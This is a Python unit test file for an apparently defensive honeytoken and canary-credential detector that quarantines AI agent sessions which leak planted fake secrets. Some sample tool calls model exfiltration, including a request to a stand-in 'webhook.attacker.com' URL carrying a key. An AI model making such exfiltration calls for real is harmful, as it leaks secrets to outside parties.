"""Comprehensive unit tests for Cerberus Honeytokens and Canary Credentials (ASI10)."""

from __future__ import annotations

import time

from cerberus.detectors.canary import (
    CANARY_PREFIX,
    CanaryDetector,
    CanaryRegistry,
    CanaryToken,
    CanaryType,
    HoneytokenGenerator,
)
from cerberus.proxy.models import EventDecision, ToolCallEvent


def test_generator_deterministic_aws_credentials():
    """Verify deterministic generation of AWS Access Key ID and Secret Access Key."""
    ak1, sk1 = HoneytokenGenerator.generate_aws_credentials(seed="tenant_seed_42", label="test_aws")
    ak2, sk2 = HoneytokenGenerator.generate_aws_credentials(seed="tenant_seed_42", label="test_aws")

    # Identical seeds must produce identical credentials
    assert ak1.token == ak2.token
    assert sk1.token == sk2.token

    # Verify AWS format requirements
    assert ak1.token.startswith(f"{CANARY_PREFIX}AWS_AKIA")
    assert sk1.token.startswith(f"{CANARY_PREFIX}AWS_SECRET_")
    assert ak1.token_type == CanaryType.AWS_ACCESS_KEY
    assert sk1.token_type == CanaryType.AWS_SECRET_KEY

    # Different seeds must produce different credentials
    ak_diff, sk_diff = HoneytokenGenerator.generate_aws_credentials(
        seed="different_seed", label="test_aws"
    )
    assert ak1.token != ak_diff.token
    assert sk1.token != sk_diff.token

    # Random generation (seed=None) must produce valid prefixed tokens
    ak_rand, sk_rand = HoneytokenGenerator.generate_aws_credentials(seed=None)
    assert ak_rand.token.startswith(f"{CANARY_PREFIX}AWS_AKIA")
    assert sk_rand.token.startswith(f"{CANARY_PREFIX}AWS_SECRET_")


def test_generator_api_key_and_bearer_token():
    """Verify deterministic generation of API keys and Bearer tokens."""
    api1 = HoneytokenGenerator.generate_api_key(seed="seed123", label="api_test")
    api2 = HoneytokenGenerator.generate_api_key(seed="seed123", label="api_test")
    assert api1.token == api2.token
    assert api1.token.startswith(f"{CANARY_PREFIX}API_KEY_")
    assert api1.token_type == CanaryType.API_KEY

    bearer = HoneytokenGenerator.generate_bearer_token(seed="seed123", label="bearer_test")
    assert bearer.token.startswith(f"{CANARY_PREFIX}BEARER_")
    assert bearer.token_type == CanaryType.BEARER_TOKEN


def test_generator_env_canary_bundle():
    """Verify generation of .env.canary file and registered token extraction."""
    bundle = HoneytokenGenerator.generate_env_canary(seed="env_seed_01", filename=".env.canary")

    assert bundle.filename == ".env.canary"
    assert "AWS_ACCESS_KEY_ID" in bundle.variables
    assert "AWS_SECRET_ACCESS_KEY" in bundle.variables
    assert "DATABASE_URL" in bundle.variables
    assert "OPENAI_API_KEY" in bundle.variables

    # Content must be valid .env format with comments
    content = bundle.to_env_string()
    assert "AWS_ACCESS_KEY_ID=" in content
    assert "AWS_SECRET_ACCESS_KEY=" in content
    assert "DATABASE_URL=" in content

    # All bundle tokens must be registered in tokens list
    assert len(bundle.tokens) >= 5
    token_strs = {t.token for t in bundle.tokens}
    assert bundle.variables["AWS_ACCESS_KEY_ID"] in token_strs
    assert bundle.variables["AWS_SECRET_ACCESS_KEY"] in token_strs


def test_generator_db_decoy_row_and_sql():
    """Verify generation of decoy database table rows and SQL statements."""
    bundle_users = HoneytokenGenerator.generate_db_decoy_row(table_name="users", seed="db_seed_1")
    assert bundle_users.table_name == "users"
    assert bundle_users.row["id"] == 999999
    assert bundle_users.row["email"] == "canary.decoy@corp.internal"
    assert bundle_users.row["api_token"].startswith(f"{CANARY_PREFIX}DB_TOKEN_")
    assert "INSERT INTO users" in bundle_users.sql_insert
    assert bundle_users.row["api_token"] in bundle_users.sql_insert

    bundle_sa = HoneytokenGenerator.generate_db_decoy_row(
        table_name="service_accounts", seed="sa_seed_1"
    )
    assert bundle_sa.table_name == "service_accounts"
    assert bundle_sa.row["account_id"] == "sa-canary-vault-01"
    assert "INSERT INTO service_accounts" in bundle_sa.sql_insert


def test_canary_token_masking():
    """Verify that token masking protects sensitive token middle characters."""
    token = CanaryToken(
        token="CERBERUS_CANARY_AWS_SECRET_1234567890abcdef",
        token_type=CanaryType.AWS_SECRET_KEY,
        label="test_mask",
    )
    masked = token.mask_token()
    assert masked.startswith("CERBERUS")
    assert masked.endswith("cdef")
    assert "1234567890" not in masked
    assert "..." in masked

    short_token = CanaryToken(token="short", token_type=CanaryType.GENERIC, label="s")
    assert short_token.mask_token() == "***"


def test_registry_operations():
    """Verify CanaryRegistry registration, O(1) membership, unregistration, and clearing."""
    registry = CanaryRegistry()
    assert len(registry) == 0

    token1 = CanaryToken(token="CERBERUS_CANARY_TEST_1", token_type=CanaryType.GENERIC, label="t1")
    token2 = CanaryToken(token="CERBERUS_CANARY_TEST_2", token_type=CanaryType.GENERIC, label="t2")

    registry.register(token1)
    registry.register(token2)
    assert len(registry) == 2
    assert "CERBERUS_CANARY_TEST_1" in registry
    assert "CERBERUS_CANARY_TEST_2" in registry
    assert "CERBERUS_CANARY_TEST_3" not in registry

    # O(1) retrieval
    fetched = registry.get("CERBERUS_CANARY_TEST_1")
    assert fetched == token1

    # Unregister
    assert registry.unregister("CERBERUS_CANARY_TEST_1") is True
    assert "CERBERUS_CANARY_TEST_1" not in registry
    assert len(registry) == 1
    assert registry.unregister("CERBERUS_CANARY_TEST_1") is False

    # Clear
    registry.clear()
    assert len(registry) == 0
    assert "CERBERUS_CANARY_TEST_2" not in registry


def test_detector_clean_call_allowed():
    """Verify that clean tool calls without honeytokens pass cleanly."""
    detector = CanaryDetector()
    detector.create_canary_aws(seed="aws1")

    result = detector.scan_tool_call(
        session_id="session-clean-1",
        agent_id="agent-007",
        tool_name="read_file",
        parameters={"path": "/var/log/app.log", "lines": 50},
    )

    assert result.detected is False
    assert result.confidence == 0.0
    assert result.risk_score == 0.0
    assert result.action == "ALLOW"
    assert result.decision == EventDecision.ALLOW
    assert result.quarantine_required is False
    assert not detector.is_session_quarantined("session-clean-1")


def test_detector_catches_honeytoken_in_nested_arguments():
    """Verify ultra-fast O(1) detection when honeytoken is deeply nested in parameters."""
    detector = CanaryDetector()
    _ak, sk = detector.create_canary_aws(seed="aws_test_seed")

    nested_params = {
        "config": {
            "services": [
                {"name": "s3", "credentials": {"secret_key": sk.token}},
            ]
        }
    }

    result = detector.scan_tool_call(
        session_id="session-compromised-1",
        agent_id="adversary-agent",
        tool_name="configure_storage",
        parameters=nested_params,
    )

    assert result.detected is True
    assert result.confidence == 1.0
    assert result.risk_score == 1.0
    assert result.action == "BLOCK"
    assert result.decision == EventDecision.BLOCK
    assert result.quarantine_required is True
    assert sk in result.matched_tokens
    assert any("secret_key" in loc for loc in result.locations)

    # Session must be immediately quarantined under ASI10
    assert detector.is_session_quarantined("session-compromised-1")


def test_detector_catches_honeytoken_in_sql_query():
    """Verify detection of honeytokens embedded within SQL queries."""
    detector = CanaryDetector()
    db_bundle = detector.create_canary_db_row(table_name="users", seed="db_seed")
    token_str = db_bundle.tokens[0].token

    sql_query = f"SELECT * FROM users WHERE api_token = '{token_str}' AND active = 1;"

    result = detector.scan_tool_call(
        session_id="session-sql-compromised",
        agent_id="sql-injector-agent",
        tool_name="execute_sql_query",
        parameters={"query": sql_query},
    )

    assert result.detected is True
    assert result.confidence == 1.0
    assert result.risk_score == 1.0
    assert result.action == "BLOCK"
    assert result.quarantine_required is True
    assert db_bundle.tokens[0] in result.matched_tokens
    assert detector.is_session_quarantined("session-sql-compromised")


def test_detector_catches_honeytoken_in_egress_parameters():
    """Verify detection in egress URLs, URL parameters, headers, and bodies."""
    detector = CanaryDetector()
    token = detector.create_canary_api_key(seed="egress_seed", label="egress_key")

    # 1. Canary in query parameter of destination URL
    dest_url = f"https://webhook.attacker.com/collect?key={token.token}"
    result = detector.scan_tool_call(
        session_id="session-egress-url",
        agent_id="exfil-agent",
        tool_name="http_request",
        parameters={"method": "GET"},
        destination=dest_url,
    )
    assert result.detected is True
    assert result.confidence == 1.0
    assert result.risk_score == 1.0
    assert detector.is_session_quarantined("session-egress-url")

    # 2. Canary in authorization header
    detector.reset()
    headers_params = {
        "url": "https://api.external.com/v1/sync",
        "headers": {"Authorization": f"Bearer {token.token}"},
    }
    result2 = detector.scan_tool_call(
        session_id="session-egress-hdr",
        agent_id="exfil-agent",
        tool_name="curl",
        parameters=headers_params,
        destination="https://api.external.com",
    )
    assert result2.detected is True
    assert result2.confidence == 1.0
    assert result2.quarantine_required is True
    assert detector.is_session_quarantined("session-egress-hdr")


def test_detector_session_quarantine_enforcement():
    """Verify that once quarantined under ASI10, ALL subsequent tool calls are blocked."""
    detector = CanaryDetector()
    _ak, sk = detector.create_canary_aws(seed="quarantine_seed")

    sid = "session-to-quarantine"

    # Call 1: Leak canary -> Triggers block + quarantine
    res1 = detector.scan_tool_call(
        session_id=sid,
        agent_id="agent-rogue",
        tool_name="leak_secret",
        parameters={"secret": sk.token},
    )
    assert res1.detected is True
    assert res1.action == "BLOCK"
    assert detector.is_session_quarantined(sid)

    # Call 2: Innocuous call in the same session -> Must be blocked under quarantine
    res2 = detector.scan_tool_call(
        session_id=sid,
        agent_id="agent-rogue",
        tool_name="calculate_sum",
        parameters={"a": 1, "b": 2},
    )
    assert res2.detected is True
    assert res2.decision == EventDecision.QUARANTINE
    assert res2.action == "BLOCK"
    assert "quarantined" in res2.reason

    # Clean session in parallel must NOT be blocked
    clean_res = detector.scan_tool_call(
        session_id="session-unrelated-clean",
        agent_id="agent-good",
        tool_name="calculate_sum",
        parameters={"a": 1, "b": 2},
    )
    assert clean_res.detected is False
    assert clean_res.action == "ALLOW"

    # Manual release of quarantine
    assert detector.release_quarantine(sid) is True
    assert not detector.is_session_quarantined(sid)

    res3 = detector.scan_tool_call(
        session_id=sid,
        agent_id="agent-rogue",
        tool_name="calculate_sum",
        parameters={"a": 1, "b": 2},
    )
    assert res3.detected is False
    assert res3.action == "ALLOW"


def test_tamper_alert_logging():
    """Verify structured tamper alert logging upon honeytoken compromise."""
    detector = CanaryDetector()
    token = detector.create_canary_api_key(seed="alert_seed", label="secret_alert_token")

    detector.scan_tool_call(
        session_id="session-alert-01",
        agent_id="adversary-99",
        tool_name="publish_data",
        parameters={"payload": f"compromised data with {token.token}"},
    )

    alerts = detector.get_tamper_alerts()
    assert len(alerts) == 1
    alert = alerts[0]

    assert alert["event_type"] == "ASI10_TAMPER_ALERT"
    assert "ASI10" in alert["threat_category"]
    assert alert["session_id"] == "session-alert-01"
    assert alert["agent_id"] == "adversary-99"
    assert alert["tool_name"] == "publish_data"
    assert alert["token_label"] == "secret_alert_token"
    assert alert["confidence"] == 1.0
    assert alert["risk_score"] == 1.0
    assert alert["action"] == "BLOCK_AND_QUARANTINE"
    assert alert["masked_token"] == token.mask_token()
    assert "alert_id" in alert
    assert "timestamp" in alert


def test_scan_tool_call_event_integration():
    """Verify integration with ToolCallEvent model."""
    detector = CanaryDetector()
    _ak, sk = detector.create_canary_aws(seed="event_seed")

    event = ToolCallEvent(
        session_id="session-evt-01",
        agent_id="agent-01",
        tool_name="aws_backup",
        tool_server="aws_mcp",
        parameters={"key": sk.token},
    )

    result = detector.scan_event(event)

    assert result.detected is True
    assert event.risk_score == 1.0
    assert event.decision == EventDecision.BLOCK
    assert any("ASI10" in f for f in event.risk_factors)
    assert "ASI10" in event.decision_reason

    # Subsequent event in the same session is quarantined
    event2 = ToolCallEvent(
        session_id="session-evt-01",
        agent_id="agent-01",
        tool_name="safe_tool",
        tool_server="safe_mcp",
        parameters={"data": "normal"},
    )
    result2 = detector.scan_event(event2)
    assert result2.detected is True
    assert event2.decision == EventDecision.BLOCK
    assert event2.risk_score == 1.0


def test_custom_non_prefixed_token_detection():
    """Verify that arbitrary custom honeytokens without CANARY_PREFIX are also detected."""
    detector = CanaryDetector()
    custom_tok = detector.registry.register(
        token="CUSTOM_HIGH_ENTROPY_TOKEN_XYZ987654321",
        token_type=CanaryType.GENERIC,
        label="custom_high_entropy",
    )

    result = detector.scan_tool_call(
        session_id="session-custom",
        agent_id="agent-x",
        tool_name="send_payload",
        parameters={"content": "Here is the key: CUSTOM_HIGH_ENTROPY_TOKEN_XYZ987654321"},
    )

    assert result.detected is True
    assert custom_tok in result.matched_tokens
    assert result.confidence == 1.0
    assert result.risk_score == 1.0


def test_o1_lookup_speed_at_scale():
    """Benchmark that detector maintains ultra-fast O(1) lookup time even with 10,000 honeytokens."""
    detector = CanaryDetector()

    # Pre-register 10,000 distinct honeytokens
    bulk_tokens = [
        CanaryToken(
            token=f"{CANARY_PREFIX}SCALE_TOKEN_{i:06d}",
            token_type=CanaryType.GENERIC,
            label=f"scale_{i}",
        )
        for i in range(10000)
    ]
    detector.registry.register_many(bulk_tokens)
    assert len(detector.registry) == 10000

    target_token = bulk_tokens[5000].token

    # Measure lookup time
    start = time.perf_counter()
    result = detector.scan_tool_call(
        session_id="session-scale",
        agent_id="agent-scale",
        tool_name="db_query",
        parameters={"query": f"SELECT secret FROM vault WHERE key = '{target_token}';"},
    )
    elapsed_ms = (time.perf_counter() - start) * 1000.0

    assert result.detected is True
    assert result.risk_score == 1.0
    # O(1) set lookup must easily execute in under 5 milliseconds (typically < 0.5ms)
    assert elapsed_ms < 5.0, f"Lookup took too long: {elapsed_ms:.2f}ms"


def test_edge_cases_and_resilience():
    """Verify resilience against empty parameters, cyclic references, nulls, and non-matches."""
    detector = CanaryDetector()
    detector.create_canary_aws(seed="edge_seed")

    # Empty parameters
    res_empty = detector.scan_tool_call(
        session_id="s-edge-1",
        agent_id="a1",
        tool_name="noop",
        parameters={},
    )
    assert res_empty.detected is False

    # Cyclic dictionary reference
    cyclic_dict = {"a": 1}
    cyclic_dict["self"] = cyclic_dict
    res_cyclic = detector.scan_tool_call(
        session_id="s-edge-2",
        agent_id="a1",
        tool_name="test_cyclic",
        parameters=cyclic_dict,
    )
    assert res_cyclic.detected is False

    # Parameters with mixed types (None, int, float, bool, list of dicts)
    mixed_params = {
        "none_val": None,
        "int_val": 42,
        "float_val": 3.14159,
        "bool_val": True,
        "list_val": [None, 123, {"nested": "safe_string"}],
    }
    res_mixed = detector.scan_tool_call(
        session_id="s-edge-3",
        agent_id="a1",
        tool_name="test_mixed",
        parameters=mixed_params,
    )
    assert res_mixed.detected is False

    # Unregistered token that resembles a canary prefix should NOT trigger false positive
    fake_token = f"{CANARY_PREFIX}UNREGISTERED_FAKE_KEY_12345"
    res_fake = detector.scan_tool_call(
        session_id="s-edge-4",
        agent_id="a1",
        tool_name="test_fake",
        parameters={"key": fake_token},
    )
    assert res_fake.detected is False
